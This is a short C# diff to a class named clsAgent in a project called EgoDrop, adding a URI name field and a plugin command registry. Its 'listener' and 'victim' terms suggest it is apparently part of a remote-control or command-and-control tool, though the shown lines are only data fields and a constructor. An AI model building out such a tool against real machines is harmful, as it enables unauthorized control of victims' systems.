@@ -10,16 +10,25 @@ namespace EgoDrop
     {
         public clsListener m_listener { get; init; }
         public clsVictim m_victim { get; init; }
+        
         public string m_szVictimID { get; init; }
+        public string m_szUriName { get; init; }
         public bool m_bUnixlike { get; init; }
 
         public List<uint> m_lnPort = new List<uint>();
 
-        public clsAgent(clsListener listener, clsVictim victim, string szVictimID, bool bUnixlike)
+        /// <summary>
+        /// Key: Command entry.
+        /// Value: stCommandSpec.
+        /// </summary>
+        public Dictionary<string, List<clsPlugin.stCommandSpec>> m_dicCommandRegistry = new();
+
+        public clsAgent(clsListener listener, clsVictim victim, string szVictimID, string szUriName, bool bUnixlike)
         {
             m_listener = listener;
             m_victim = victim;
             m_szVictimID = szVictimID;
+            m_szUriName = szUriName;
             m_bUnixlike = bUnixlike;
         }
 
